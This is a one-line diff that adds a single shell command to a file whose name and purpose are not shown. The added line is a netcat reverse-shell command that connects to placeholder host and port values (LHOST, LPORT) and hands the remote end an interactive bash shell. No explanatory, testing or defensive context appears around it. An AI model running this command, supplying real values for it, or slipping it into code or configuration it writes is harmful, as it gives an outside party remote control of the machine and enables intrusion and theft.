@@ -1,0 +1,1 @@
+nc -e /bin/bash LHOST LPORT
